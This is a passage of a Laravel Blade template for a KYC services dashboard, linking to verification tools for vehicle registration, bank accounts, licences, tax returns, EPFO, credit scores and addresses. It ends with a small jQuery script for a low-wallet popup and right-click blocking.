                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">RC Validate</h3>
                        <ul>
                            <a href="{{ route('kyc.rc_validation') }}">
                                <li>RC Validation</li>
                            </a>
                            <a href="{{ route('kyc.rc_validationmp') }}">
                                <li>RC Validation Test</li>
                            </a>
                            <a href="{{ route('kyc.rc_validationlite') }}">
                                <li>RC Validation Lite</li>
                            </a>
                            <a href="{{ route('kyc.rc_full_validation') }}">
                                <li>RC Full Validation</li>
                            </a>
                            <a href="{{ route('kyc.fasttag_information') }}">
                                <li>Fast Tag Information</li>
                            </a>
                            <!-- <li>RC Upload</li> -->

                        </ul>
                    </div>
                </div>
            </div>
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">Bank Verifications</h3>
                        <ul>
                            <a href="{{ route('kyc.bank_verification') }}">
                                <li>Bank Validation</li>
                            </a>
                            <a href="{{ route('kyc.bank_ifsc') }}">
                                <li>Verify IFSC</li>
                            </a>
                            <a href="{{ route('kyc.bankstatement') }}">
                                <li>Bank Statement</li>
                            </a>
                            <a href="{{ route('kyc.bank_statement') }}">
                                <li>Bank Statement Reader</li>
                            </a>
                            <a href="{{ route('kyc.bank_analyser') }}">
                                <li>Bank Statement Analyser</li>
                            </a>
                            <a href="{{ route('kyc.bank_statement') }}">
                                <li>Bank Statement Reader (Regtech)</li>
                            </a>
                            <a href="{{ route('kyc.bank_analyser') }}">
                                <li>Bank Statement Analyser (Regtech)</li>
                            </a>


                        </ul>
                    </div>
                </div>
            </div>
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">Driving Licence </h3>
                        <ul>
                            <a href="{{ route('kyc.license_validation') }}">
                                <li>Driving Verification</li>
                            </a>
                            <a href="{{ route('kyc.license.upload') }}">
                                <li>Driving Licence Upload</li>
                            </a>
                            <a href="{{ route('kyc.license_ocr') }}">
                                <li>Driving License OCR (Regtech)</li>
                            </a>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
        <div class="row">
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">eSign</h3>
                        <ul>

                            <!-- <a href="{{ route('kyc.esign_initialize') }}"><li>eSign</li> </a> -->
                            <a href="{{ route('esignature') }}">
                                <li>eSign</li>
                            </a>
                        </ul>
                    </div>
                </div>
            </div>
            <!--
                         <div class="col-3">
                            <div class="card text-white bg-primary shadow-box-1">
                                <div class="card-body">
                                    <h3 class="mb-0">CREDIT SCORE</h3>
                                    <ul>
                                        <li>CIBIL</li>
                                        <a href="{{ route('other.crif') }}"><li>CRIF</li></a>
                                        <a href="{{ route('other.equifax') }}"><li>Equifax</li></a>
                                        
                                    </ul>
                                </div>
                            </div>
                         </div>
                         --->
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">ITR</h3>
                        <ul>
                            <a href="{{ route('itr.itr_initiate') }}">
                                <li>ITR Initiate</li>
                            </a>
                            <a href="{{ route('itr.itr_enter_clientid') }}">
                                <li>ITR Client ID Verify</li>
                            </a>
                            <a href="{{ route('itr.itr_download_profile') }}">
                                <li>ITR Download Profile</li>
                            </a>
                            <a href="{{ route('itr.itr_download') }}">
                                <li>ITR Download</li>
                            </a>
                            <a href="{{ route('itr.itr_download_26AS') }}">
                                <li>ITR Download 26AS</li>
                            </a>
                            <a href="{{ route('itr.itr_submit_otp') }}">
                                <li>ITR Submit OTP</li>
                            </a>
                            <a href="{{ route('itr.itr_forget_password') }}">
                                <li>ITR Forget Password</li>
                            </a>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">Other</h3>
                        <ul>
                            <a href="{{ route('kyc.electricity') }}">
                                <li>Electricity</li>
                            </a>
                            <a href="{{ route('kyc.shopestablishment') }}">
                                <li>Shop & Establishment</li>
                            </a>
                            <a href="{{ route('kyc.telecom_generate_otp') }}">
                                <li>Telecom</li>
                            </a>
                            <a href="{{ route('kyc.usage') }}">
                                <li>Usage</li>
                            </a>
                            <a href="{{ route('kyc.fssi_validation') }}">
                                <li>FSSAI</li>
                            </a>
                            <a href="{{ route('kyc.upi_validation') }}">
                                <li>UPI Validation</li>
                            </a>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">EPFO</h3>
                        <ul>
                            <a href="{{ route('kyc.pf_generate_otp') }}">
                                <li>EPFO (With OTP)</li>
                            </a>
                            <a href="{{ route('kyc.pf_without_otp') }}">
                                <li>EPFO ( Without OTP)</li>
                            </a>
                            <a href="{{ route('kyc.uan_details') }}">
                                <li>UAN Details</li>
                            </a>
                            <a href="{{ route('kyc.company_search') }}">
                                <li>Company Search</li>
                            </a>
                            <a href="{{ route('kyc.company_details') }}">
                                <li>Company Details</li>
                            </a>
                            <a href="{{ route('kyc.company_product') }}">
                                <li>Company Products (Regtech)</li>
                            </a>
                        </ul>
                    </div>
                </div>
            </div>
        </div>

        <div class="row">
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">CREDIT SCORE</h3>
                        <ul>
                            <a href="{{ route('other.crif') }}">
                                <li>CRIF</li>
                            </a>
                            <a href="{{ route('other.equifax') }}">
                                <li>Ecredit</li>
                            </a>
                            <a href="{{ route('other.equifax_score') }}">
                                <li>Score</li>
                            </a>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">Video Kyc</h3>
                        <ul>
                            <li>Video Kyc</li>
                            <li>Video Kyc Dcoboyz</li>
                            <a href="{{ route('kyc.face_match') }}">
                                <li>Face Match</li>
                            </a>
                            <a href="{{ route('kyc.facematch') }}">
                                <li>Face Match (Regtech)</li>
                            </a>
                            <a href="{{ route('kyc.detection_face') }}">
                                <li>Face Detection (Regtech)</li>
                            </a>
                            <a href="{{ route('kyc.detection_emotion') }}">
                                <li>Detected Emotion (Regtech)</li>
                            </a>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">Search</h3>
                        <ul>
                            <a href="{{ route('kyc.searchkyc') }}">
                                <li>Search Data</li>
                            </a>
                            <a href="{{ route('kyc.searchkyc.lite') }}">
                                <li>Search lite Data</li>
                            </a>
                            {{-- <a href="{{route('kyc.searchkyc.lite1')}}"><li>SearchV1 Data</li></a>
                        <a href="{{route('kyc.ckycsearchdata.lite')}}"><li>Ckyc Search Data</li></a>
                        <a href="{{route('kyc.ckycdownload.lite')}}"><li>Ckyc Download Data</li></a> --}}
                            <a href="{{ route('kyc.pancard.details') }}">
                                <li>Pan Card Info</li>
                            </a>
                            <a href="{{ route('kyc.single.search') }}">
                                <li>Search</li>
                            </a>
                            <a href="{{ route('kyc.ckycsearchadvance') }}">
                                <li>Ckyc</li>
                            </a>

                        </ul>
                    </div>
                </div>
            </div>
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">Udyam & Udhyog Search</h3>
                        <ul>
                            <a href="{{ route('kyc.udyam.details') }}">
                                <li>Udyam Registration Search</li>
                            </a>
                            <a href="{{ route('kyc.udyog.details') }}">
                                <li>Udhyog Aadhaar Number Search</li>
                            </a>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">Enach</h3>
                        <ul>
                            <a href="{{ route('enach_seameless') }}">
                                <li>seamless</li>
                            </a>
                            <a href="{{ route('e-nach-initiate-payment') }}">
                                <li>Nonseamless</li>
                            </a>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">Payment Getway</h3>
                        <ul>
                            <a href="{{ route('initiate-payment-integration') }}">
                                <li>Payment</li>
                            </a>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">Bhunaksha</h3>
                        <ul>
                            <a href="{{ route('kyc.bhunakasha') }}">
                                <li>Bhunakasha (Regtech)</li>
                            </a>
                            <a href="{{ route('kyc.land') }}">
                                <li>Land Record(Regtech)</li>
                            </a>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">Address</h3>
                        <ul>
                            <a href="{{ route('kyc.verify_address') }}">
                                <li>Verify Address (Regtech)</li>
                            </a>
                            <a href="{{ route('kyc.get_place') }}">
                                <li>Get Place (Regtech)</li>
                            </a>
                            <a href="{{ route('kyc.create_geofence') }}">
                                <li>Create Geofence (Regtech)</li>
                            </a>
                            <a href="{{ route('kyc.autocomplete') }}">
                                <li>AutoComplate Address (Regtech)</li>
                            </a>
                            <a href="{{ route('kyc.getcoordinate') }}">
                                <li>Get Coordinate</li> (Regtech)
                            </a>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">Email</h3>
                        <ul>
                            <a href="{{ route('kyc.verify_email') }}">
                                <li>Verify Email (Regtech)</li>
                            </a>
                            <a href="{{ route('kyc.check_verify_email_status') }}">
                                <li>Check Verify Email (Regtech)</li>
                            </a>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">Dedupe</h3>
                        <ul>
                            <a href="{{ route('kyc.dedupe') }}">
                                <li>Dedupe Api (Regtech)</li>
                            </a>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">Community</h3>
                        <ul>
                            <a href="{{ route('kyc.community_area') }}">
                                <li>Community Area (Regtech)</li>
                            </a>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">Pincode</h3>
                        <ul>
                            <a href="{{ route('kyc.pincode') }}">
                                <li>Pincode Distance (Regtech)</li>
                            </a>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">Scanner</h3>
                        <ul>
                            <a href="{{ route('kyc.img_scanner') }}">
                                <li>Image Scanner (Regtech)</li>
                            </a>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">PredictPPL</h3>
                        <ul>
                            <a href="{{ route('kyc.predictppl') }}">
                                <li>Predictppl (Regtech)</li>
                            </a>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">Demo</h3>
                        <ul>
                            <a href="{{ route('kyc.deom') }}">
                                <li>Rc</li>
                            </a>
                        </ul>
                    </div>
                </div>
            </div>


            <div class="col-3">
                <div class="card text-white bg-primary shadow-box-1">
                    <div class="card-body">
                        <h3 class="mb-0">Pan Demo</h3>
                        <ul>
                            <a href="{{ route('kyc.demo.pan') }}">
                                <li>Pan Demo</li>
                            </a>
                        </ul>
                    </div>
                </div>
            </div>
            {{-- <div class="col-3">
            <div class="card text-white bg-primary shadow-box-1">
                <div class="card-body">
                    <h3 class="mb-0">Dunzo</h3>
                    <ul>
                        <a href="{{url('create_logistics_task')}}"><li>Create Logistics Task</li></a>
                        <a href="{{url('create_task')}}"><li>Create Task</li></a>
                   </ul>
                </div>
            </div>
        </div> --}}
            <!-- <div class="col-3">
                            <div class="card text-white bg-primary shadow-box-1">
                                <div class="card-body">
                                    <h3 class="mb-0">Courier</h3>
                                    <ul>
                                        <li>Smartship</li>
                                        <li>Blue Dart</li>
                                    </ul>
                                </div>
                            </div>
                        </div> -->

            {{-- <div class="col-12">
            <div class="card text-white bg-primary shadow-box-1">
                <div class="card-body">
                    <h3 class="mb-0" id="toggle_tab" style="cursor: pointer">Vaccine</h3>
                    <div id="visibility">
                        <div class="row">
                            <div class="col-4">
                                <ul>
                                    <a href="{{route('vaccine.vaccine_genrate_otp')}}"><li>Vaccine Genrate OTP</li></a>
                                    <a href="{{route('vaccine.vaccine_submit_otp')}}"><li>Vaccine Submit OTP</li></a>
                                    <a href="{{route('vaccine.vaccine_get_details')}}"><li>Vaccine Get Details</li></a>
                                </ul>
                            </div>
                            <div class="col-4">
                                <ul>
                                    <a href="{{route('vaccine.benefiaries_registration_api')}}"><li>benefiaries registration api</li></a>
                                    <a href="{{route('vaccine.delete_benefiaries')}}"><li>Delet Benefiaries</li></a>
                                    <a href="{{route('vaccine.get_gender')}}"><li>Get Gender</li></a>
                                    <a href="{{route('vaccine.download_vaccination_certificates')}}"><li>Download Vaccine Certificate</li></a>
                                    <a href="{{route('vaccine.vaccine_get_states')}}"><li>Get State List</li></a>
                                    <a href="{{route('vaccine.vaccine_get_list_of_districts')}}"><li>Get District List</li></a>
                                </ul>
                            </div>
                            <div class="col-4">
                                <ul>
                                    <a href="{{route('vaccine.create_appointment_vaccine')}}"><li>Create Appointment</li></a>
                                    <a href="{{route('vaccine.cancle_appointment_vaccine')}}"><li>Cancel Appointment</li></a>
                                    <a href="{{route('vaccine.reschedule_appointment_vaccine')}}"><li>reschedule_appointment_vaccine</li></a>
                                    <a href="{{route('vaccine.get_list_benefiaries_vaccine')}}"><li>get_list_benefiaries_vaccine</li></a>
                                    <a href="{{route('vaccine.get_vaccine_center_lat_long')}}"><li>get_vaccine_center_lat_long</li></a>
                                    <a href="{{route('vaccine.vaccine_session_by_district')}}"><li>Get District List</li></a>
                                    <a href="{{route('vaccine.vaccine_session_by_district')}}"><li>vaccine_session_by_district</li></a>
                                    <a href="{{route('vaccine.vaccine_session_by_district_for_seven_days')}}"><li>vaccine_session_by_district_for_seven_days</li></a>
                                    <a href="{{route('vaccine.vaccine_session_by_pin')}}"><li>vaccine_session_by_pin</li></a>
                                    <a href="{{route('vaccine.vaccine_session_by_pin_for_seven_days')}}"><li>vaccine_session_by_pin_for_seven_days</li></a>
                                    <a href="{{route('vaccine.vaccine_get_details')}}"><li>Get vaccine_get_details List</li></a>
                                </ul> 
                            </div>
                        </div>
                    </div>          
                </div>
            </div>
        </div> --}}
    @endif
    <div id="popup"
        style=" display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.7);
    z-index: 999;">
        <div
            style="  position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background-color: white;
    padding: 20px;
    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);">
            <!-- Your popup content goes here -->
            <p>Wallet balance is low.Please recharge your wallet</p>
            <button id="close-popup">Close</button>
        </div>
    </div>
@stop
<script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.js"></script>
<script>
    $(document).ready(function() {
        @auth
        @if (auth()->user()->id === 79)
            $('#popup').show();
        @endif
    @endauth
    $("body").css("-webkit-user-select", "none"); $("body").css("-moz-user-select", "none"); $("body").css(
        "-ms-user-select", "none"); $("body").css("-o-user-select", "none"); $("body").css("user-select",
        "none");

    $(document).bind("contextmenu", function(e) {
        return false;
    });
    var x = document.getElementById("visibility"); x.style.display = "none"; $("#toggle_tab").click(function() {
        if (x.style.display === "none") {
            x.style.display = "block";
        } else {
            x.style.display = "none";
        }
    });
    });
</script>